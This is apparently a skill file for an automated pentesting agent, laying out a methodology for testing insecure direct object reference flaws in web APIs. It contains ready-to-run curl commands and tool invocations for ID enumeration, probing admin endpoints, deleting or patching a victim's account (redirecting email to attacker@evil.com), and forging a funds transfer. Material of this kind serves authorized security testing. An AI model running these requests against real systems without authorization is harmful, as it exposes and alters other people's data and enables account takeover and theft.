---
name: attack-idor-automation
description: "IDOR automated testing — cross-account access, horizontal/vertical privilege escalation, mass data exposure"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - idor
  - bac
  - access-control
  - web
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-639
  - CWE-284
chains_with:
  - attack-jwt
  - attack-graphql
prerequisites: []
severity_boost:
  attack-jwt: "JWT tamper + IDOR = full account takeover"
---

# IDOR Automated Testing

## Objective

Systematically test all API endpoints for Insecure Direct Object Reference vulnerabilities using two accounts with different privilege levels.

## Testing Methodology

### Phase 1: Set Up Two Accounts

1. **Account A** (victim) — owns resources being tested
2. **Account B** (attacker) — tries to access Account A's resources

### Phase 2: Automated Cross-Account Testing

```bash
# Test endpoints from file
attack_script idor_tester \
  --token-a "VICTIM_JWT" \
  --token-b "ATTACKER_JWT" \
  --endpoints endpoints.txt \
  --json-output

# Test comma-separated endpoints
attack_script idor_tester \
  --token-a "VICTIM_JWT" \
  --token-b "ATTACKER_JWT" \
  --endpoints "https://TARGET/api/users/123,https://TARGET/api/orders/456,https://TARGET/api/profile/123" \
  --method GET

# Test write operations
attack_script idor_tester \
  --token-a "VICTIM_JWT" \
  --token-b "ATTACKER_JWT" \
  --endpoints endpoints.txt \
  --method PUT \
  --data '{"name":"pwned"}'
```

### Phase 3: Manual Testing Patterns

**Horizontal IDOR (same role, different user):**
```bash
# Sequential IDs
curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/1
curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/2

# UUID guessing (if predictable)
curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/UUID_OF_OTHER_USER

# Endpoint enumeration
for id in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer ATTACKER_TOKEN" "https://TARGET/api/orders/$id"
done
```

**Vertical IDOR (low-priv accessing high-priv):**
```bash
# User accessing admin endpoints
curl -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/admin/users
curl -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/admin/settings
curl -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/internal/reports
```

### Phase 4: HTTP Method Switching

```bash
# GET blocked but DELETE works
curl -X DELETE -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/VICTIM_ID

# GET blocked but PATCH works
curl -X PATCH -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/VICTIM_ID \
  -d '{"email":"attacker@evil.com"}'
```

### Phase 5: Parameter Pollution

```bash
# Dual ID injection
curl "https://TARGET/api/profile?user_id=ATTACKER&user_id=VICTIM"

# Body override
curl -X POST https://TARGET/api/transfer \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -d '{"from":"VICTIM_ID","to":"ATTACKER_ID","amount":1000}'
```

### Phase 6: Response Comparison

```bash
# Compare responses between two auth contexts
attack_script response_diff "https://TARGET/api/users/VICTIM_ID" \
  --header-a "Authorization:Bearer VICTIM_TOKEN" \
  --header-b "Authorization:Bearer ATTACKER_TOKEN" \
  --json-output
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Read other user's PII (email, SSN, etc.) | Critical (P1) |
| Modify other user's data | Critical (P1) |
| Delete other user's resources | Critical (P1) |
| Access admin functionality | Critical (P1) |
| Read non-sensitive data of other user | Medium (P3) |

## Evidence Requirements

- Two different auth tokens used
- Endpoint tested
- Account A (victim) response as baseline
- Account B (attacker) accessing Account A's resource
- Data received proving cross-account access

## Tools

- `attack_script idor_tester` — automated cross-account testing
- `attack_script response_diff` — response comparison
- `attack_script jwt_tamper` — token manipulation for IDOR

## References

- [OWASP: IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger: Access Control](https://portswigger.net/web-security/access-control/idor)
